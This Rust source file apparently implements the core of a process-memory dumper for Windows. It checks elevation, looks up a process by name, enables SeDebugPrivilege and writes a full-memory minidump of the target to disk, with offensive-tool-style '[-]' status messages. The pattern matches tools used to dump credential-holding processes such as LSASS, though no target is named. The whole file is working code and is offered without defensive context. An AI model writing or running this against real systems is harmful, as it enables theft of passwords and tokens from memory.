use std::ffi::OsStr;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use winapi::shared::minwindef::BOOL;
use winapi::shared::minwindef::{DWORD, FALSE};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileW, CREATE_ALWAYS};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcess, OpenProcessToken};
use winapi::um::securitybaseapi::{AdjustTokenPrivileges, GetTokenInformation};
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use winapi::um::winbase::LookupPrivilegeValueW;
use winapi::um::winnt::{
    FILE_ATTRIBUTE_NORMAL, GENERIC_ALL, HANDLE, LUID, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
    SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_ELEVATION, TOKEN_PRIVILEGES, TOKEN_QUERY,
    TokenElevation,
};

const MINIDUMP_WITH_FULL_MEMORY: DWORD = 0x00000002;

// winapi 0.3 doesn't expose MiniDumpWriteDump directly; declare the FFI here.
// We only ever pass NULL for the optional struct pointers, so use c_void.
#[link(name = "dbghelp")]
extern "system" {
    fn MiniDumpWriteDump(
        hProcess: HANDLE,
        ProcessId: DWORD,
        hFile: HANDLE,
        DumpType: DWORD,
        ExceptionParam: *const core::ffi::c_void,
        UserStreamParam: *const core::ffi::c_void,
        CallbackParam: *const core::ffi::c_void,
    ) -> BOOL;
}

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()}

pub struct SafeHandle(HANDLE);

impl SafeHandle {
    pub fn new(h: HANDLE) -> Self {
        SafeHandle(h)
    }

    pub fn raw(&self) -> HANDLE {
        self.0
    }

    pub fn is_valid(&self) -> bool {
        !self.0.is_null() && self.0 != INVALID_HANDLE_VALUE
    }
}

impl Drop for SafeHandle {
    fn drop(&mut self) {
        if self.is_valid() {
            unsafe {
                CloseHandle(self.0);
            }
        }
    }
}

pub fn is_elevated() -> bool {
    unsafe {
        let mut token: HANDLE = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == FALSE {
            return false;
        }
        let token = SafeHandle::new(token);

        let mut elevation: TOKEN_ELEVATION = mem::zeroed();
        let mut size: DWORD = mem::size_of::<TOKEN_ELEVATION>() as DWORD;

        if GetTokenInformation(
            token.raw(),
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            size,
            &mut size,
        ) == FALSE
        {
            return false;
        }

        elevation.TokenIsElevated != 0
    }
}

pub fn get_process_id_by_name(name: &str) -> Option<u32> {
    let target: Vec<u16> = to_wide(name);

    unsafe {
        let snapshot = SafeHandle::new(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
        if !snapshot.is_valid() {
            return None;
        }

        let mut entry: PROCESSENTRY32W = mem::zeroed();
        entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot.raw(), &mut entry) == FALSE {
            return None;
        }

        loop {
            let exe_name: Vec<u16> = entry
                .szExeFile
                .iter()
                .take_while(|&&c| c != 0)
                .copied()
                .chain(std::iter::once(0))
                .collect();

            if exe_name == target {
                return Some(entry.th32ProcessID);
            }

            if Process32NextW(snapshot.raw(), &mut entry) == FALSE {
                break;
            }
        }

        None
    }
}

pub fn enable_debug_privilege() -> bool {
    let priv_name = to_wide("SeDebugPrivilege");

    unsafe {
        let mut token: HANDLE = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token) == FALSE {
            return false;
        }
        let token = SafeHandle::new(token);

        let mut luid: LUID = mem::zeroed();
        if LookupPrivilegeValueW(ptr::null(), priv_name.as_ptr(), &mut luid) == FALSE {
            return false;
        }

        let mut tp: TOKEN_PRIVILEGES = mem::zeroed();
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if AdjustTokenPrivileges(token.raw(), FALSE, &mut tp, 0, ptr::null_mut(), ptr::null_mut())
            == FALSE
        {
            return false;
        }

        GetLastError() == 0
    }
}

pub fn dump_to_file(pid: u32, output_path: &str) -> bool {
    let path_wide = to_wide(output_path);

    unsafe {
        let file_handle = SafeHandle::new(CreateFileW(
            path_wide.as_ptr(),
            GENERIC_ALL,
            0,
            ptr::null_mut(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            ptr::null_mut(),
        ));

        if !file_handle.is_valid() {
            eprintln!("  [-] Failed to create output file");
            return false;
        }

        let access = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
        let process = SafeHandle::new(OpenProcess(access, FALSE, pid));

        if !process.is_valid() {
            eprintln!("  [-] Failed to open target process");
            return false;
        }

        let result = MiniDumpWriteDump(
            process.raw(),
            pid,
            file_handle.raw(),
            MINIDUMP_WITH_FULL_MEMORY,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
        );

        result != FALSE
    }
}
